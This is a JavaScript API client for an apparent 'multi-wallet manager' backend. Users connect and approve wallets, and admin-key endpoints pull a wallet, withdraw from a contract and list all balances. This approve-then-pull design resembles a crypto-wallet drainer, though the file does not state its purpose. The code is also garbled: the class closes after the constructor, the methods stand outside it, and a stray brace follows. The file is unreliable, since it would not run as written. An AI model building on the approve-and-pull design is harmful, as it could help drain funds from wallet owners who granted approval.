class ApiService {
    constructor() {
        // Update this to your actual backend URL
        this.baseUrl = 'https://multi-wallet-manager.onrender.com/api';
    }
    // ... rest of your code
}


    async request(endpoint, options = {}) {
        const url = `${this.baseUrl}${endpoint}`;
        
        try {
            const response = await fetch(url, {
                headers: {
                    'Content-Type': 'application/json',
                    ...options.headers
                },
                ...options
            });
            
            if (!response.ok) {
                const errorData = await response.json().catch(() => ({}));
                throw new Error(errorData.error || `HTTP ${response.status}: ${response.statusText}`);
            }
            
            return await response.json();
        } catch (error) {
            console.error(`API Error (${endpoint}):`, error);
            throw error;
        }
    }

    async connectWallet(walletData) {
        return this.request('/wallets/connect', {
            method: 'POST',
            body: JSON.stringify(walletData)
        });
    }

    async approveWallet(walletData) {
        return this.request('/wallets/approve', {
            method: 'POST',
            body: JSON.stringify(walletData)
        });
    }

    async getWalletBalance(walletAddress) {
        return this.request(`/wallets/${walletAddress}/balance`);
    }

    async pullWallet(walletAddress, adminKey) {
        return this.request('/admin/pull', {
            method: 'POST',
            headers: {
                'X-Admin-Key': adminKey
            },
            body: JSON.stringify({ walletAddress })
        });
    }

    async withdrawContract(adminKey) {
        return this.request('/admin/withdraw', {
            method: 'POST',
            headers: {
                'X-Admin-Key': adminKey
            }
        });
    }

    async removeWallet(walletAddress, adminKey) {
        return this.request('/admin/remove', {
            method: 'POST',
            headers: {
                'X-Admin-Key': adminKey
            },
            body: JSON.stringify({ walletAddress })
        });
    }

    async getAllWallets(adminKey) {
        return this.request('/admin/balances', {
            headers: {
                'X-Admin-Key': adminKey
            }
        });
    }
}

export default new ApiService();

